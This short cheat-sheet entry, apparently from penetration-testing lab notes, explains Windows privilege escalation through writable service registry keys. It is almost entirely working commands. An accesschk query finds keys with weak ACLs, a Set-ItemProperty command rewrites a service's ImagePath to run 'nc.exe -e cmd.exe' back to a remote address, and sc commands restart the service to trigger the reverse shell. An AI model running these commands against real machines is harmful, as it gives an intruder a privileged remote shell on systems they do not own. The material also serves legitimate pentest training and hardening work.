
**Concept**: service config (including the ImagePath it launches) lives in the registry under `HKLM\SYSTEM\CurrentControlSet\services`. If that registry key is writable by you, you don't need filesystem or `sc` access at all — edit the registry directly.

### **Find weak ACLs on service registry keys**

```
accesschk64.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

Look for `KEY_ALL_ACCESS` granted to your user/group.

### **Exploit — change ImagePath**

```
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

Then stop/start the service same as before.

```
sc stop ModelManagerService
```

```
sc start ModelManagerService
```
